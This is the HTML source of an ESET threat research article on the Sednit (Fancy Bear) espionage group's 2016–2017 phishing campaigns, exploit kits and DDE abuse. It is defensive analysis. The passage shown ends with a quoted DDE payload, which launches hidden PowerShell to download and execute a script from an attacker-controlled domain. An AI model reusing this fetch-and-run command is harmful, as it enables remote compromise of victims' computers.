<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'ESET Research',
        'ArticleCategory': '',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Sednit update: How Fancy Bear Spent the Year | WeLiveSecurity</title>
<meta name="description" content="The Sednit group, also known as Fancy Bear, continue to use phishing emails as their flagship backdoor main entry with a great deal of success."/>
<link rel="canonical" href="https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Sednit update: How Fancy Bear Spent the Year | WeLiveSecurity" />
<meta property="og:description" content="The Sednit group, also known as Fancy Bear, continue to use phishing emails as their flagship backdoor main entry with a great deal of success." />
<meta property="og:url" content="https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:published_time" content="2017-12-21T13:58:28+00:00" />
<meta property="article:modified_time" content="2018-04-17T10:49:09+00:00" />
<meta property="og:updated_time" content="2018-04-17T10:49:09+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/12/Fancy_Bear-2-623x432-1.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2017/12/Fancy_Bear-2-623x432-1.jpg" />
<meta property="og:image:width" content="623" />
<meta property="og:image:height" content="432" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="The Sednit group, also known as Fancy Bear, continue to use phishing emails as their flagship backdoor main entry with a great deal of success." />
<meta name="twitter:title" content="Sednit update: How Fancy Bear Spent the Year | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/12/Fancy_Bear-2-623x432-1.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2017/12/28/actualizacion-sednit-anio-fancy-bear/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2017/12/22/sednit-gruppe-malware-kampagnen/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/12/28/actualizacion-sednit-anio-fancy-bear/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/12/22/sednit-gruppe-malware-kampagnen/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/12/28/actualizacion-sednit-anio-fancy-bear/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/12/22/sednit-gruppe-malware-kampagnen/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2017/12/Fancy_Bear-2-623x432-1.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>Sednit update: How Fancy Bear Spent the Year</h1>
<div class="excerpt">Over the past few years the Sednit group has used various techniques to deploy their various components on targets computers. The attack usually starts with an email containing either a malicious link or malicious attachment.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/04/android-fullpage-1024x576-Copy-222x179.jpg" alt="ESET Research">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2017-12-21 14:58:28">21 Dec 2017 - 02:58PM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F12%2F21%2Fsednit-update-fancy-bear-spent-year%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F12%2F21%2Fsednit-update-fancy-bear-spent-year%2F&text=Sednit update: How Fancy Bear Spent the Year%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F12%2F21%2Fsednit-update-fancy-bear-spent-year%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>Over the past few years the Sednit group has used various techniques to deploy their various components on targets computers. The attack usually starts with an email containing either a malicious link or malicious attachment.</p>
                            </div>

                            <p>The Sednit group — also known as Strontium, APT28, Fancy Bear or Sofacy — is a group of attackers operating since 2004, if not earlier, and whose main objective is to steal confidential information from specific targets.</p>
<p>This article is a follow-up to ESET’s presentation at <a href="https://blogs.technet.microsoft.com/bluehat/2017/09/01/announcing-the-bluehat-v17-schedule/" target="_blank" rel="noopener">BlueHat</a> in November 2017. Late in 2016 we published a <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf" target="_blank" rel="noopener">white paper</a> covering Sednit activity between 2014 and 2016. Since then, we have continued to actively track Sednit&#8217;s operations, and today we are publishing a brief overview of what our tracking uncovered in terms of the group’s activities and updates to their toolset. The first section covers the update of their attack methodology: namely, the ways in which this group tries to compromise their targets systems. The second section covers the evolution of their tools, with a particular emphasis on a detailed analysis of a new version of their flagship malware: Xagent.</p>
<h2>The Campaigns</h2>
<p>Over the past few years the Sednit group has used various techniques to deploy their various components on targets computers. The attack usually starts with an email containing either a malicious link or malicious attachment. We have seen a shift in the methods they use &#8216;in the course of the year&#8217;, though. Sedkit was their preferred attack vector in the past, but that exploit kit has completely disappeared since late 2016. The <a href="https://researchcenter.paloaltonetworks.com/2016/10/unit42-dealerschoice-sofacys-flash-player-exploit-platform/" target="_blank" rel="noopener">DealersChoice</a> exploit platform has been their preferred method since the publication of our white paper, but we saw other methods being used by this group, such as macros or the use of Microsoft Word Dynamic Data Exchange.</p>
<p>The following three sections will describe the different methods used by Sednit’s operator to gain an initial foothold on a target system. Generally, these campaigns will try to install Seduploader on the target system. Seduploader is a first stage backdoor that can be used to assess the target’s importance and download additional malware. If the system is indeed of interest to them, it is likely that Sednit’s operators will eventually install Xagent on it.</p>
<h2>Sedkit (Sednit Exploit Kit)</h2>
<p>Sedkit was an exploit kit used exclusively by the Sednit group. During its lifetime, Sednit leveraged vulnerabilities in various persistently vulnerable applications, but mostly Adobe Flash and Internet Explorer. When Sedkit was first <a href="http://www.welivesecurity.com/2014/10/08/sednit-espionage-group-now-using-custom-exploit-kit/" target="_blank" rel="noopener">discovered</a>, potential victims were redirected to its landing page through a watering-hole scheme. Following that campaign, their preferred method consisted of malicious links embedded in emails sent to Sednit’s targets. Sedkit’s workflow is illustrated below.</p>
<p><em><a href="/wp-content/uploads/2017/12/sedkit_workflow.png"><img class="aligncenter wp-image-105607" src="/wp-content/uploads/2017/12/sedkit_workflow-300x70.png" alt="Fancy Bear" width="640" height="149" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/sedkit_workflow-300x70.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/12/sedkit_workflow-768x178.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/sedkit_workflow.png 771w" sizes="(max-width: 640px) 100vw, 640px" /></a></em></p>
<p>Between August and September 2016, we saw several different email campaigns trying to lure the recipients of their messages to a Sedkit landing page. Sedkit’s targets at that time were mostly embassies, and political parties in Central Europe. The next figure shows an email containing such a URL.</p>
<p><a href="/wp-content/uploads/2017/12/mail_worldpostjournal.png"><img class="aligncenter wp-image-105609" src="/wp-content/uploads/2017/12/mail_worldpostjournal-300x193.png" alt="Fancy Bear" width="640" height="411" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal-300x193.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal-768x493.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal-1024x657.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal-65x42.png 65w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>The email tries to fool its recipient into believing that the link will ultimately lead to an interesting news story. In this case, the article is supposedly about an earthquake that struck near Rome in August 2016. While the email impersonates someone the victim would consider trustworthy, there are two major hints that could lead an attentive recipient to conclude that this email is fake. The first one is that there are spelling mistakes (e.g. “Greetigs!”). Spelling mistakes are common in malicious Sednit mails. The second one is the URL’s domain part. It is a purely malicious domain, but the path part of the URL actually mimics a real, legitimate link. In this particular case, the URL path is the same as one used in a BBC story about this earthquake. Again, this is a commonly-used Sednit tactic, using popular stories found on legitimate news websites and redirecting targets that click on the emailed URL to the real website, but not before visiting the Sedkit landing page. Besides the BBC, The Huffington Post is another popular media outlet whose stories they like to use as bait.</p>
<p>The email shown below, where the link redirects to Sedkit, exhibits several interesting features.</p>
<p><a href="/wp-content/uploads/2017/12/mail_worldpostjournal2-1.png"><img class="aligncenter wp-image-105610" src="/wp-content/uploads/2017/12/mail_worldpostjournal2-1-300x193.png" alt="Fancy Bear" width="640" height="411" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal2-1-300x193.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal2-1-768x493.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal2-1-1024x657.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_worldpostjournal2-1-65x42.png 65w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Firstly, the email’s subject and URL path are not aligned: the former refers to Syria and Aleppo while the latter refers to WADA and Russian hacking. Secondly, there are two glaring spelling mistakes. The first one, is again the use of &#8220;Greetigs!&#8221; and the second one is &#8220;Unated Nations&#8221;. Hopefully, someone working for the United Nations’ public relations department would not have such a glaring error in their email signature block.</p>
<p>The last campaign using Sedkit was observed in October 2016. It is interesting to note that the disappearance of Sedkit follows a trend we have seen with other exploit kits. Most of these were relying exploits for older versions of Internet Explorer and/or Flash to perform drive-by downloads. The decline of the majority of exploit kit operations during 2016, including Sednit, could well be attributable to the code hardening performed by Microsoft and Adobe.</p>
<p>Full details of Sedkit&#8217;s inner workings can be found in our previously published <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf" target="_blank" rel="noopener">white paper</a>.</p>
<h2>DealersChoice</h2>
<p>In August 2016, Palo Alto Networks <a href="https://researchcenter.paloaltonetworks.com/2016/10/unit42-dealerschoice-sofacys-flash-player-exploit-platform/" target="_blank" rel="noopener">blogged</a> about a new platform used by Sednit to breach a system initially. This platform, which they called DealersChoice, has the ability to generate malicious documents with embedded Adobe Flash Player exploits. There are two variants of this platform. The first one checks which Flash Player version is installed on the system and then selects one of three different vulnerabilities. The second variant will first contact a C&amp;C server which will deliver the selected exploit and the final malicious payload. Of course, the second version is much harder to analyze, as the document delivered to the targets does not contain all the pieces of the puzzle.</p>
<p>This platform is still in use today by Sednit and, like Sedkit, tracks international news stories and includes a reference to them in their malicious emails, in an attempt to lure the target into opening the malicious document attachment. Sometimes, they also use other, non-political, schemes. In December 2016, they used a rather unusual (for the group) lure:</p>
<p><a href="/wp-content/uploads/2017/12/mail_merrychristmas.png"><img class="aligncenter wp-image-105611" src="/wp-content/uploads/2017/12/mail_merrychristmas-300x193.png" alt="Fancy Bear" width="640" height="411" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_merrychristmas-300x193.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_merrychristmas-768x493.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_merrychristmas-1024x657.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_merrychristmas-65x42.png 65w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p><a href="/wp-content/uploads/2017/12/doc_merrychristmas.png"><img class="aligncenter wp-image-105612" src="/wp-content/uploads/2017/12/doc_merrychristmas-300x192.png" alt="Fancy Bear" width="640" height="410" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_merrychristmas-300x192.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_merrychristmas-768x492.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_merrychristmas-1024x656.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_merrychristmas-65x42.png 65w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>This email was sent to multiple Ministries of Foreign Affairs and embassies in Europe on December 22nd and 23rd, and contained a Word document attachment that appeared to be a Christmas eCard. Note that this was the first time that we saw the Sednit group use a non-geopolitical phishing gambit attempting to trap their targets. Of course, the Word document, if opened, uses DealersChoice to try to compromise the system. Sednit used DealersChoice intensively in late 2016, but the platform was not seen for a long time after that. In fact, the first time we saw them use it in 2017 was in October.</p>
<p><a href="/wp-content/uploads/2017/12/doc_Caucasian_Eagle_ENG.png"><img class="aligncenter wp-image-105613" src="/wp-content/uploads/2017/12/doc_Caucasian_Eagle_ENG-300x192.png" alt="Fancy Bear" width="640" height="410" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_Caucasian_Eagle_ENG-300x192.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_Caucasian_Eagle_ENG-768x492.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_Caucasian_Eagle_ENG-1024x656.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/12/doc_Caucasian_Eagle_ENG-65x42.png 65w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>We do not have the email used for this particular campaign, but, based on the decoy document, we can assume that government agency employees were the targets. Other campaigns using DealersChoice were the subject of different blogs published by security researchers. One noteworthy example is the one by <a href="https://www.proofpoint.com/us/threat-insight/post/apt28-racing-exploit-cve-2017-11292-flash-vulnerability-patches-are-deployed" target="_blank" rel="noopener">Proofpoint</a> where they detail the addition of a new Adobe Flash Player vulnerability to the DealersChoice platform. This indicates that this platform is still in use by this group and under constant development.</p>
<h2>Macros, VBA and DDE</h2>
<p>Besides Sedkit and DealersChoice, Sednit’s operators also continued using proven ways to compromise systems they target by relying on macros in a Microsoft Office documents, but also used other methods. One campaign that grabbed a lot of attention targeted an Eastern European MFA in April 2017. The following email was sent to an MFA employee:</p>
<p><a href="/wp-content/uploads/2017/12/mail_trump.png"><img class="aligncenter wp-image-105614" src="/wp-content/uploads/2017/12/mail_trump-300x193.png" alt="Fancy Bear" width="640" height="411" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_trump-300x193.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_trump-768x493.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_trump-1024x657.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/12/mail_trump-65x42.png 65w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>The attachment contained code exploiting two zero-days: one local privilege escalation (LPE) and one remote code execution (RCE). These two zero-days were reported by ESET to Microsoft. A detailed analysis of this campaign can be found on our <a href="https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/" target="_blank" rel="noopener">blog</a>.</p>
<p>The final case highlighted here illustrates how Sednit’s operators pay close attention to new technical developments in security. In the beginning of October 2017, <a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/" target="_blank" rel="noopener">SensePost</a> researchers wrote an article on a Microsoft Word methods called the Dynamic Data Exchange (DDE) protocol. DDE is a way to exchange data between applications. For example, it allows a Word table to be updated with the data contained in an Excel document. It is convenient, but in the case of at least Word and Excel it can also be used to execute arbitrary code, if the user ignores several warning prompts. Following the publication of that article, it did not take long to discover Sednit campaigns using DDE to execute code from a C&amp;C server. In these campaigns, documented by <a href="https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/" target="_blank" rel="noopener">McAfee</a>, the decoy document is empty, but it contains a hidden field containing the following code:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581ba326905873853979" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title">DDE</span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
"C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://sendmevideo.org/dh2025e/eee.txt');powershell -enc $e # " "a slow internet connection" "try again later"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581ba326905873853979-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581ba326905873853979-1">"C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://sendmevideo.org/dh2025e/eee.txt');powershell -enc $e # " "a slow internet connection" "try again later"</div></div></td>
					</tr>
				</table>
			</div>
		</div>
